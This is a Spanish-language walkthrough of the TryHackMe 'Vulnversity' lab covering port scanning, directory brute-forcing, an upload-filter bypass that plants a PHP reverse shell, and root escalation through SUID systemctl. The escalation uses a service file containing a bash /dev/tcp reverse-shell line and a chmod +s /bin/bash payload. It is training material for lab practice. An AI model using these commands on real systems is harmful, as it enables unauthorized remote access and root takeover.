---
layout: post
author: Isui
title: Vulnversity - TryHackMe
---
![Banner VUlnverity](/images/vulnversity/2.png "Banner")
#TryHackMe
By Isui
# Reconocimiento

Comencé enviando una trama ICMP:

```sh
──(isui㉿kali)-[~/TryHackMe/vulnversity]
└─$ ping -c 1 10.10.231.191               
PING 10.10.231.191 (10.10.231.191) 56(84) bytes of data.
64 bytes from 10.10.231.191: icmp_seq=1 ttl=63 time=190 ms

--- 10.10.231.191 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 190.164/190.164/190.164/0.000 ms
┌──(isui㉿kali)-[~/TryHackMe/vulnversity]
└─$ 
```

Gracias a la información obtenida, puedo intuir que se trata de un SO basado en Linux.

### Escaneo de puertos

Realice un escaneo de puertos, de manera general:
```sh
sudo nmap -p- --open --min-rate 1000 -sS -vv -n -Pn 10.10.231.191 -oG primerEscaneo
```

El resultado fue:

``` java
┌──(isui㉿kali)-[~/TryHackMe/vulnversity]
└─$ sudo nmap -p- --open -sS --min-rate 1000 -vv -n -Pn 10.10.231.191 -oG primerEscaneo
[sudo] password for isui: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-02 01:32 CST
Initiating SYN Stealth Scan at 01:32
Scanning 10.10.231.191 [65535 ports]
Discovered open port 22/tcp on 10.10.231.191
Discovered open port 139/tcp on 10.10.231.191
Discovered open port 445/tcp on 10.10.231.191
Discovered open port 21/tcp on 10.10.231.191
Discovered open port 3128/tcp on 10.10.231.191
Discovered open port 3333/tcp on 10.10.231.191
Completed SYN Stealth Scan at 01:33, 51.13s elapsed (65535 total ports)
Nmap scan report for 10.10.231.191
Host is up, received user-set (0.16s latency).
Scanned at 2024-07-02 01:32:12 CST for 51s
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 63
22/tcp   open  ssh          syn-ack ttl 63
139/tcp  open  netbios-ssn  syn-ack ttl 63
445/tcp  open  microsoft-ds syn-ack ttl 63
3128/tcp open  squid-http   syn-ack ttl 63
3333/tcp open  dec-notes    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 51.23 seconds
           Raw packets sent: 76370 (3.360MB) | Rcvd: 76370 (3.055MB)
```

Se utilizo una expresión regular con Grep para extraer los puertos del escaneo, y copiarlos a la clipboard:

``` sh
grep -oP '\d+/open/tcp/\S+' primerEscaneo | cut -d '/' -f 1 | tr '\n' ',' | xclip -selection clipboard
```

![](/images/vulnversity/Pasted image 20240702013648.png)

Luego de ello se realizo un escaneo más exhaustivo, para detectar las versiones de los servicios, y posibles vulnerabilidades, implementando un conjunto de scripts predeterminados de `nmap`:

```sh
sudo nmap -p21,22,139,445,3128,3333 -sC -sV 10.10.231.191 -A -oN target
```

El resultado fue el siguiente:

```java
┌──(isui㉿kali)-[~/TryHackMe/vulnversity]
└─$ sudo nmap -p21,22,139,445,3128,3333 -sC -sV 10.10.231.191 -A -oN target
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-02 01:40 CST
Nmap scan report for 10.10.231.191
Host is up (0.15s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Vuln University
|_http-server-header: Apache/2.4.18 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (93%), Sony Android TV (Android 5.0) (93%), Android 5.0 - 6.0.1 (Linux 3.4) (93%), Android 7.1.1 - 7.1.2 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: -1s
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2024-07-02T03:41:19-04:00
| smb2-time: 
|   date: 2024-07-02T07:41:19
|_  start_date: N/A

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   154.96 ms 10.21.0.1
2   155.12 ms 10.10.231.191

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.40 seconds
┌──(isui㉿kali)-[~/TryHackMe/vulnversity]
└─$ 
```

![](/images/vulnversity/Pasted image 20240702014301.png)

En base al resultado obtenido, y con la versión del servicio SSH, se busco el posible codename del SO, parece ser que nos enfrentamos a un SO **Ubuntu Xenial**:

![](/images/vulnversity/Pasted image 20240702014601.png)

Está información si bien, no es del todo crítica, es importante como parte del reconocimiento.

# Enumeración

Comencé enumerando el servicio HTTP, ya que se encontraba en un puerto poco común, lo que me da indicios de que esta ahí, posiblemente porque el equipo de desarrollo, se encuentra en producción.

Lo primero fue ingresar al sitio Web desde el navegador, para ver que información se encuentra expuesta a simple vista:

![](/images/vulnversity/Pasted image 20240702015142.png)

De manera general, puede existir una cantidad significativa de información, que llevaría bastante tiempo de estudio poder determinar cual es útil, y cual. Se muestran posibles usuarios desde el navegador:

![](/images/vulnversity/Pasted image 20240702015447.png)

Dentro de la Web se encuentra un campo, con un botón, en donde intente probar si era vulnerable a una inyección XSS:

![](/images/vulnversity/Pasted image 20240702015623.png)

Pero no ocurrió nada, por lo que por ahora descarte esté ataque. Entonces proseguí a realizar un ataque con `Gobuster`:

```sh
gobuster dir -u http://10.10.231.191:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

El resultado fue:

```go
┌──(isui㉿kali)-[~/TryHackMe/vulnversity]
└─$ gobuster dir -u http://10.10.231.191:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.231.191:3333
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 319] [--> http://10.10.231.191:3333/css/]
/js                   (Status: 301) [Size: 318] [--> http://10.10.231.191:3333/js/]
/images               (Status: 301) [Size: 322] [--> http://10.10.231.191:3333/images/]
/fonts                (Status: 301) [Size: 321] [--> http://10.10.231.191:3333/fonts/]
/internal             (Status: 301) [Size: 324] [--> http://10.10.231.191:3333/internal/]
/server-status        (Status: 403) [Size: 303]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
┌──(isui㉿kali)-[~/TryHackMe/vulnversity]
└─$ 
```

![](/images/vulnversity/Pasted image 20240702020823.png)

# Explotación

Revisando estos directorios, se encontró una página que deja subir archivos:

![](/images/vulnversity/Pasted image 20240702020916.png)

Esto me dio la idea de intentar subir un archivo para entablar una Rever Shell, pero antes de ello, me gustaría confirmar que tipo de archivos puedo subir:

![](/images/vulnversity/Pasted image 20240702021323.png)

Creé una serie de posibles archivos que intente subir:

![](/images/vulnversity/Pasted image 20240702021421.png)

![](/images/vulnversity/Pasted image 20240702021427.png)

Parece ser que no es posible este tipo de archivos, por lo que en base a mi experiencia podría probar subir otros archivos con otro tipo de extensiones como: `phar, phtml, php2, php3`

![](/images/vulnversity/Pasted image 20240702021715.png)

Realizando estás pruebas, el archivo con extension `.pthml` fue posible subirlo al servidor:

![](/images/vulnversity/Pasted image 20240702021913.png)

Sabiendo esto comencé con la Reverse Shell. En el sistema Kali, ya se incluyen una serie de Web Shells listas para ser utilizadas:

```sh
ls -la /usr/share/webshells/php
```

![](/images/vulnversity/Pasted image 20240702022246.png)

Así que copie la web shell a mi directorio de trabajo:

```sh
cp /usr/share/webshells/php/php-reverse-shell.php .
```

Pero claro, el servidor no puede interpretar un archivo con extensión `.php`, es por ello que primero edite los parámetros con NANO y luego convertí la extensión.

![](/images/vulnversity/Pasted image 20240702022708.png)

Para convertir el archivo en formato `.phtml` es tan fácil como copiarlo al mismo directorio de trabajo, pero con la nueva extensión:

```sh
cp php-reverse-shell.php php-reverse-shell.phtml
```

Yo además cambie el nombre del archivo al mítico `cmd` (pero sólo es costumbre, no es necesario) y probe en subir el archivo, pero antes de ello, deje a mi Kali en modo escucha:

```sh
nc -nlvp 4445
```

Para ejecutar el archivo, ingrese desde el navegador a la ruta:

```
http://10.10.231.191:3333/internal/uploads/cmd.phtml
```

Y pude establecer la conexión inversa:

![](/images/vulnversity/Pasted image 20240702023607.png)

Pero, se debe de recordar que esta no es una Shell Interactiva, para ello, se debe realizar el tratamiento de la TTY:

Ingresar el comando (en nuestra terminal de atacante de Kali):

```sh
script /dev/null -c bash
```

Pulsar la combinación: `ctrl + z`

Escribir el comando:

```sh
stty raw -echo; fg
```

Pulsar `Enter` y escribir:

```
reset xterm
```

Escribir:

```
export TERM=xterm
```

Ahora debemos colocar nuestra terminal en pantalla completa (si es que no lo está) para trabajar más comodo en caso de comandos muy largos:

```
stty rows 30 columns 100
```

Hemos terminado el tratamiento de nuestra terminal interactiva.

![](/images/vulnversity/Pasted image 20240702023942.png)

Ahora comencé nuevamente a enumerar el target:

![](/images/vulnversity/Pasted image 20240702024113.png)

Pude observar que me encuentro directamente en el directorio raíz del target, lo que es algo inusual.

En esta búsqueda puedo observar que el directorio /HOME cuenta con un usuario, con lo que parece ser la `flag`:

![](/images/vulnversity/Pasted image 20240702024837.png)

Una vez revisando éste directorio y su contenido, se completo la primera fase del CTF, lo que ahora sigue es intentar escalar privilegios.

# Escalada de privilegios

Primero intente buscar archivos, programas, o cualquier indicio que me indique el bit SUID para poder aprovecharme de este:

```sh
find / -perm -u=s -type f 2>/dev/null
```

El comando `find / -perm -u=s -type f 2>/dev/null` para que puedas entender cada parte:
1. **`find`**: Es una herramienta de búsqueda de archivos y directorios en Unix/Linux.
2. **`/`**: Especifica que la búsqueda debe comenzar en el directorio raíz del sistema de archivos.
3. **`-perm -u=s`**: Este parámetro indica que estamos buscando archivos con permisos específicos. Aquí, `-u=s` busca archivos que tienen el bit SUID (Set User ID) establecido. El bit SUID permite a los usuarios ejecutar el archivo con los permisos del propietario del archivo.
4. **`-type f`**: Este parámetro especifica que solo estamos buscando archivos (no directorios, enlaces simbólicos, etc.). 
5. **`2>/dev/null`**: Esto redirige los mensajes de error (descriptor de archivo 2) a `/dev/null`, que es un dispositivo especial que descarta toda la información que se le envía. Esto se hace para que los mensajes de error no se muestren en la salida del comando.

El comando `find / -perm -u=s -type f 2>/dev/null` busca en todo el sistema archivos que tienen el bit SUID establecido y que son archivos regulares. Los errores que se encuentren durante la búsqueda (por ejemplo, debido a permisos insuficientes en ciertos directorios) se descartan para que no ensucien la salida del comando.

El resultado fue:

``` java
www-data@vulnuniversity:/usr/bin$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs
www-data@vulnuniversity:/usr/bin$ 
```

![](/images/vulnversity/Pasted image 20240702032238.png)

De está búsqueda el archivo que no tiene mucho sentido que se encuentre listado es `/bin/systemctl`, por lo que busque en internet en GTFOBins: https://gtfobins.github.io/

![](/images/vulnversity/Pasted image 20240702033005.png)

Y si existía forma de abusar de éste archivo: https://gtfobins.github.io/gtfobins/systemctl/

![](/images/vulnversity/Pasted image 20240702033126.png)

### ¿Qué es SYSTEMCTL?

`systemctl` es una utilidad de línea de comandos que forma parte de `systemd`, el sistema de init y gestor de servicios en muchas distribuciones modernas de Linux. `systemd` es responsable de inicializar el sistema y gestionar servicios, sockets, dispositivos montados y otros componentes del sistema.

##### Funciones Principales de `systemctl`
1. **Administrar Servicios**:
   - **Iniciar un servicio**: `systemctl start nombre_del_servicio`
   - **Detener un servicio**: `systemctl stop nombre_del_servicio`
   - **Reiniciar un servicio**: `systemctl restart nombre_del_servicio`
   - **Recargar la configuración de un servicio sin detenerlo**: `systemctl reload nombre_del_servicio`

2. **Habilitar/Deshabilitar Servicios**:
   - **Habilitar un servicio para que se inicie al arrancar el sistema**: `systemctl enable nombre_del_servicio`
   - **Deshabilitar un servicio para que no se inicie al arrancar el sistema**: `systemctl disable nombre_del_servicio`

3. **Consultar el Estado de los Servicios**:
   - **Mostrar el estado de un servicio**: `systemctl status nombre_del_servicio`
   - **Mostrar todos los servicios y su estado**: `systemctl list-units --type=service`

4. **Gestionar el Sistema**:
   - **Apagar el sistema**: `systemctl poweroff`
   - **Reiniciar el sistema**: `systemctl reboot`
   - **Suspender el sistema**: `systemctl suspend`

5. **Administrar Unidades (units)**:
   - **Recargar todas las unidades de configuración**: `systemctl daemon-reload`
   - **Mostrar el estado de todas las unidades**: `systemctl list-units`

##### Ejemplos

- **Iniciar el servicio de Apache (httpd)**:
```sh
  sudo systemctl start httpd
```

- **Habilitar el servicio de Apache para que se inicie al arrancar**:
 ```sh
  sudo systemctl enable httpd
 ```

- **Ver el estado del servicio de Apache**:
  ```sh
  systemctl status httpd
  ```

##### Beneficios de `systemd` y `systemctl`

- **Arranque y gestión de servicios más rápidos**.
- **Dependencias explícitas entre servicios**.
- **Mejor manejo de la paralelización durante el arranque del sistema**.
- **Registro detallado y centralizado de logs mediante `journald`**.

Para poder aprovecharme de éste binario, seguí las instrucciones que encontré:

```
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
sudo systemctl link $TF
sudo systemctl enable --now $TF
```

Estuve bastante tiempo intentando abusar de este binario, por este medio, pero no logre tener éxito. Pero buscando, encontré que se podia crear un archivo de configuración con un Payload y fue lo que hice, es muy similar, pero con ligeras diferencias, así que desde de mi máquina Kali, escribí el siguiente código:

```
nano root.service
```

Para ver el archivo con colores utilice `batcat`:

![](/images/vulnversity/Pasted image 20240702040728.png)

Este archivo tiene la extensión `.service` y describe cómo se debe comportar y gestionar un servicio del sistema. Está escrito en un formato específico de `systemd`, que no es propiamente un lenguaje de programación, sino más bien un formato de configuración.

###### Análisis del Archivo `root.service`
Vamos a desglosar cada parte del archivo:
`[Unit]`
- **Line 2: `Description=root`**
  - Proporciona una descripción breve del servicio. En este caso, simplemente dice "root".
`[Service]`
- **Line 5: `Type=simple`**
  - Indica que el servicio es de tipo "simple", lo que significa que el 0servicio se considera iniciado tan pronto como se inicia el proceso especificado en `ExecStart`.
- **Line 6: `User=root`**
  - Especifica que el servicio se ejecutará como el usuario `root`.
- **Line 7: `ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.21.16.176/4444 0>&1'`**
  - Especifica el comando que se ejecutará cuando se inicie el servicio. En este caso, se ejecuta un comando Bash que abre una conexión inversa (reverse shell) hacia la dirección IP `10.21.16.176` en el puerto `4444`.
 `[Install]`
- **Line 10: `WantedBy=multi-user.target`**
  - Indica que este servicio debe iniciarse cuando el sistema alcanza el objetivo `multi-user.target`, que es el modo multiusuario (similar al runlevel 3 en sistemas SysVinit).
##### Comportamiento del Servicio
Este servicio está configurado para abrir una reverse shell. Cuando se inicia, el comando Bash en `ExecStart` abre una conexión TCP hacia `10.21.16.176` en el puerto `4444` y redirige la entrada y salida de Bash a esta conexión. Esto permite al atacante (presumiblemente en la máquina con IP `10.21.16.176`) obtener acceso interactivo a la shell del sistema en el que se ejecuta este servicio, con privilegios de usuario `root`. Este archivo de servicio es un ejemplo de un backdoor, y su propósito es obtener acceso no autorizado al sistema. La configuración de este servicio debe ser revisada y eliminada si no fue intencionada, ya que representa un grave riesgo de seguridad.

Luego de ello, lo envié al target desde un servidor HTTP con Python (desdé mi máquina Kali en donde se encuentra el archivo que cree):

```
python3 -m http.server
```

Para descargarlo en el `target`, lo hice mediante `wget`:

```sh
wget http://10.21.16.176:8000/root.service
```

![](/images/vulnversity/Pasted image 20240702041240.png)

Ahora habilite el servicio que acabo de crear:

```sh
systemctl enable /var/tmp/root.service
```

![](/images/vulnversity/Pasted image 20240702041703.png)

El comando `systemctl enable /var/tmp/root.service` creará un enlace simbólico en el directorio `/etc/systemd/system/multi-user.target.wants/`, apuntando al archivo `/var/tmp/root.service`. Esto hace que el servicio se incluya en el objetivo `multi-user.target`, lo que significa que el servicio se iniciará automáticamente cuando el sistema alcance el modo multiusuario.

Ahora desde mi máquina Kali, pongo en escucha desde el puerto 4444:

![](/images/vulnversity/Pasted image 20240702041739.png)

Para ahora iniciar el servicio:

```sh
systemctl start root
```

![](/images/vulnversity/Pasted image 20240702042114.png)

Y de está manera es como se inicializa ahora una Reverse Shell en modo Root:

![](/images/vulnversity/Pasted image 20240702042206.png)

Navegando, se puede obtener la última bandera del usuario Root:

![](/images/vulnversity/Pasted image 20240702042550.png)

De está manera se termina este CTF. Gracias por leerme!


WIth <3 <img src="https://tryhackme-badges.s3.amazonaws.com/IsuiMartinez.png" alt="TryHackMe">  

And H4ppy H4cking!
